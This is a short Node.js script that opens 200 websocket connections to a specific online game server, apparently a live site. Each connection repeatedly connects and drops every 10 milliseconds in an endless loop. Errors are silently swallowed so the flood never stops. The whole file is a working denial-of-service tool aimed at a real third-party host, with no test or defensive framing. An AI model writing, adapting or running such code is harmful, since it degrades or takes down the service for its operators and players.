const io = require("socket.io-client");

const SOCKET_URL = "https://na-3.swordonline.io";
const SOCKET_COUNT = 200;

function createFlappingSocket(id) {
  let socket;

  const connect = () => {
    try {
      socket = io(SOCKET_URL, {
        transports: ["websocket"],
        reconnection: false,
      });

      socket.on("connect", () => {
        console.log(`[${id}] Connected`);
        // Slight delay before disconnecting
        setTimeout(() => {
          try {
            socket.disconnect();
          } catch (err) {}
        }, 10);
      });

      socket.on("disconnect", () => {
        console.log(`[${id}] Disconnected`);
        // Slight delay before reconnecting
        setTimeout(() => {
          try {
            connect();
          } catch (err) {}
        }, 10);
      });

      socket.on("connect_error", () => {});
      socket.on("error", () => {});
    } catch (err) {
      // Prevent stack overflow on sync errors
      setTimeout(() => connect(), 10);
    }
  };

  connect();
}

// Start all sockets in parallel
for (let i = 1; i <= SOCKET_COUNT; i++) {
  try {
    createFlappingSocket(i);
  } catch (err) {
    // Always recover
  }
}
